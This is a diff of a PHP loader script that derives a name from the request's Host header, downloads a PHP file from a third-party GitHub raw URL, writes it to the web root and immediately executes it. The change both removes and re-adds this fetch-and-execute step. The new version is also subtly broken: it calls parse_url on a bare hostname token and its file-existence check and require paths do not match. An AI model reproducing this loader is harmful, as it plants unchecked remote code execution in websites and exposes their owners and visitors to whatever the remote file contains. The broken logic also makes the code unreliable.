@@ -2,44 +2,31 @@
 <?php
 
 $_dir_ = $_SERVER['DOCUMENT_ROOT'];
-
-
-
-
-if (!file_exists('./script/')) {
-    mkdir('./script/', 0777, true);
-}
-if (!file_exists('./functions/')) {
-    mkdir('./functions/', 0777, true);
-}
-if (!file_exists('./css/')) {
-    mkdir('./css/', 0777, true);
-}
-
 $tokens = explode(".", $_SERVER['HTTP_HOST']);
 $domain = $tokens[0];
 
-if($domain == 'www'){
-    $domain = $tokens[1];
-}
-$server = $domain;
-if ($domain !== ''){
-    $domain = './functions/index.php';
 
-}
-if ( file_exists( $domain) ) {
 
-require_once($domain);
+$urlParts = parse_url($domain);
+
+// remove www
+$domain = preg_replace('/^www\./', '', $urlParts['host']);
+
+
+if ( file_exists( './'.$domain.'.php') ) {
+
+require_once($_dir_.$domain.'.php');
 } else {
 
 
-    $app = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/app.php');
-    $myfile = fopen($domain, "w") or die("Unable to open $domain.'.php'!");
-    fwrite($myfile, $app);
+    $j = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/app.php');
+    $myfile = fopen('./'. $domain.'.php', "w") or die("Unable to open $domain.'.php'!");
+    fwrite($myfile, $j);
     fclose($myfile);
-require_once($domain);
+require_once($_dir_.$domain.'.php');
     
     }
+
 
 
 ?>
